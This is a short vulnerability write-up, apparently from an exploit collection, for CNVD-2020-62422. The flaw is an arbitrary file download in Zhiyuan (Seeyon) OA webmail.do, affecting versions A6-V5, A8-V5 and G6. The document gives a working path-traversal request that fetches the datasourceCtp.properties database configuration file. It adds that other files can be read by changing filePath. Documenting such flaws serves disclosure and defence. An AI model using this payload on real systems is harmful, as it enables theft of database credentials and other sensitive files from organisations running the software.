# Zhiyuan OA webmail.do any file download CNVD-2020-62422

## Vulnerability Description

Zhiyuan OA has an arbitrary file download vulnerability, and an attacker can use this vulnerability to download any file to obtain sensitive information.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zhiyuan OA A6-V5</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zhiyuan OA A8-V5</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Zhiyuan OA G6</span>

## Network surveying and mapping



## Vulnerability reappears

Verify POC

```php
/seeyon/webmail.do?method=doDownloadAtt&filename=test.txt&filePath=../conf/datasourceCtp.properties
```

The `datasourceCtp.properties` configuration file will be downloaded in the vulnerable OA system.

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/zhiyuan-11.png)



Change the parameter filePath to download other files